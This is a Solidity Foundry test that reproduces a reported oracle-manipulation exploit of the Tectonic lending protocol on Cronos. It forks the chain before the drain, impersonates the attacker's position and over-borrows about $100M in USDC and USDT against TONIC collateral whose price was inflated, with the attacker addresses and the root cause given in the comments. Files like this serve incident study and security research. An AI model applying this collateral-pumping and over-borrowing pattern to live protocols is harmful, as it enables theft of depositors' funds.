// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$75M (PeckShield ~$74M; ~$6M bridged to ETH before Cronos halt)
// Attacker EOA         : 0x4266a0E6A0f0ef90AbCFF3BB089932cA0CCe3652
// Attack contract      : 0xd3aaC8a1a9e412E2C590463a8B6F90125e23f1F3
// Position / borrower  : 0x2dc6A36F4e5eeEFE112C01569de96dEa496Bb618
// Profit sink (Cronos) : 0x7D4E7e5DcB0CCc66B4F0f8b0F30DA5078Ad4F2DC (~$60M trapped)
// ETH bridge wallet    : 0xc404160B79BD8905061a1cAecBeCa2EEab3f72DD (~$6M → ~2.6k ETH)
// TectonicSocket       : 0xb3831584acb95ED9cCb0C11f677B5AD01DeaeEc0
// tTONIC (collateral)  : 0xfe6934FDf050854749945921fAA83191Bccf20Ad
// TONIC underlying     : 0xDD73dEa10ABC2Bff99c60882EC5b2B81Bb1Dc5B2
// tUSDC / tUSDT        : 0xB3bbf1bE…F4c8e / 0xA683fdfD…44E5
// Price oracle         : 0xD360D8cABc1b2e56eCf348BFF00D2Bd9F658754A
// TONIC/USD feed       : 0x14f753940720C1Fa4247Cd464C7EA28c806d123F (VVS + Crypto.com)
// Setup tx             : 0x0fce5ae8…7d06 @ 90896190
// Over-borrow tx       : 0xddc9dc47…eca20 @ 90897110
// Alert                : https://x.com/GoPlusSecurity/status/2094268398662537542
//
// Root cause: Tectonic listed thin-liq TONIC as collateral (CF 20%) and priced it via an
// internal oracle fed by VVS spot (+ CEX). Attacker pumped TONIC ~100–200×, posted tTONIC
// collateral, then over-borrowed USDT/USDC/other assets (Mango-style). Cronos validators
// halted the chain, trapping most funds on Cronos.
//
// PoC: fork one block before the over-borrow drain (oracle already inflated, tTONIC
// collateral already posted on the position contract) and re-borrow USDC + USDT.

address constant ATTACKER_EOA = 0x4266a0E6A0f0ef90AbCFF3BB089932cA0CCe3652;
address constant POSITION = 0x2dc6A36F4e5eeEFE112C01569de96dEa496Bb618;
address constant TECTONIC_SOCKET = 0xb3831584acb95ED9cCb0C11f677B5AD01DeaeEc0;
address constant TTONIC = 0xfe6934FDf050854749945921fAA83191Bccf20Ad;
address constant TONIC = 0xDD73dEa10ABC2Bff99c60882EC5b2B81Bb1Dc5B2;
address constant TUSDC = 0xB3bbf1bE947b245Aef26e3B6a9D777d7703F4c8e;
address constant TUSDT = 0xA683fdfD9286eeDfeA81CF6dA14703DA683c44E5;
address constant USDC = 0xc21223249CA28397B4B6541dfFaEcC539BfF0c59;
address constant USDT = 0x66e428c3f67a68878562e79A0234c1F83c208770;
address constant ORACLE = 0xD360D8cABc1b2e56eCf348BFF00D2Bd9F658754A;
address constant TONIC_FEED = 0x14f753940720C1Fa4247Cd464C7EA28c806d123F;

// Over-borrow mined in 90897110; fork one block earlier (oracle already pumped)
uint256 constant FORK_BLOCK = 90_897_109;
// Leave a little cash dust; historical drain moved ~55.24M USDC + ~45.65M USDT from tTokens
uint256 constant BORROW_USDC = 55_000_000e6;
uint256 constant BORROW_USDT = 45_000_000e6;

interface ITToken {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function underlying() external view returns (address);
    function symbol() external view returns (string memory);
}

interface ITectonicOracle {
    function getUnderlyingPrice(address tToken) external view returns (uint256);
}

interface ITonicFeed {
    function latestAnswer() external view returns (int256);
    function decimals() external view returns (uint8);
}

interface ITectonicSocket {
    function getAccountLiquidity(address account) external view returns (uint256 err, uint256 liquidity, uint256 shortfall);
    function markets(address tToken) external view returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function oracle() external view returns (address);
}

contract TectonicTonicOracleManipulation_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Prefer named foundry.toml endpoint; allow env override for archive RPCs.
        // Offline: anvil --load-state anvil_state.json --port 8561 --chain-id 25
        //   then TECTONIC_FORK_URL=http://127.0.0.1:8561 forge test
        string memory rpc = vm.envOr("TECTONIC_FORK_URL", string(""));
        if (bytes(rpc).length == 0) {
            rpc = vm.envOr("CRONOS_RPC_URL", string(""));
        }
        if (bytes(rpc).length == 0) {
            rpc = "cronos";
        }
        vm.createSelectFork(rpc, FORK_BLOCK);

        multiAssetLog = true;
        fundingTokens.push(USDC);
        fundingTokens.push(USDT);
        attacker = POSITION;

        vm.label(ATTACKER_EOA, "Attacker EOA");
        vm.label(POSITION, "Attacker position");
        vm.label(TECTONIC_SOCKET, "TectonicSocket");
        vm.label(TTONIC, "tTONIC");
        vm.label(TONIC, "TONIC");
        vm.label(TUSDC, "tUSDC");
        vm.label(TUSDT, "tUSDT");
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(ORACLE, "Tectonic oracle");
        vm.label(TONIC_FEED, "TONIC/USD feed");
    }

    function testExploit() public balanceLog {
        uint256 price = ITectonicOracle(ORACLE).getUnderlyingPrice(TTONIC);
        emit log_named_decimal_uint("Oracle TONIC underlying price (1e18)", price, 18);
        // Pre-pump ~1.062e10 (~$1.06e-8); at fork ~2.076e12 (~$2.08e-6) ≈ 195×
        require(price >= 1e12, "oracle not yet inflated");

        int256 answer = ITonicFeed(TONIC_FEED).latestAnswer();
        emit log_named_int("TONIC/USD feed answer (12 decimals)", answer);

        (bool listed, uint256 cf,) = ITectonicSocket(TECTONIC_SOCKET).markets(TTONIC);
        require(listed, "tTONIC not listed");
        emit log_named_decimal_uint("tTONIC collateral factor", cf, 18);
        require(cf == 0.2e18, "unexpected CF");

        uint256 tTonicBal = ITToken(TTONIC).balanceOf(POSITION);
        emit log_named_decimal_uint("Position tTONIC collateral", tTonicBal, 8);
        require(tTonicBal > 0, "no tTONIC collateral");

        (uint256 err, uint256 liq, uint256 shortfall) = ITectonicSocket(TECTONIC_SOCKET).getAccountLiquidity(POSITION);
        emit log_named_uint("getAccountLiquidity err", err);
        emit log_named_decimal_uint("Account liquidity (USD 1e18)", liq, 18);
        emit log_named_uint("shortfall", shortfall);
        require(err == 0 && shortfall == 0 && liq > 50_000_000e18, "insufficient liquidity");

        uint256 usdcBefore = IERC20(USDC).balanceOf(POSITION);
        uint256 usdtBefore = IERC20(USDT).balanceOf(POSITION);

        vm.startPrank(POSITION);
        uint256 e1 = ITToken(TUSDC).borrow(BORROW_USDC);
        uint256 e2 = ITToken(TUSDT).borrow(BORROW_USDT);
        vm.stopPrank();
        require(e1 == 0, "USDC borrow failed");
        require(e2 == 0, "USDT borrow failed");

        uint256 usdcProfit = IERC20(USDC).balanceOf(POSITION) - usdcBefore;
        uint256 usdtProfit = IERC20(USDT).balanceOf(POSITION) - usdtBefore;
        emit log_named_decimal_uint("USDC borrowed (profit)", usdcProfit, 6);
        emit log_named_decimal_uint("USDT borrowed (profit)", usdtProfit, 6);
        require(usdcProfit >= BORROW_USDC, "USDC short");
        require(usdtProfit >= BORROW_USDT, "USDT short");
    }
}
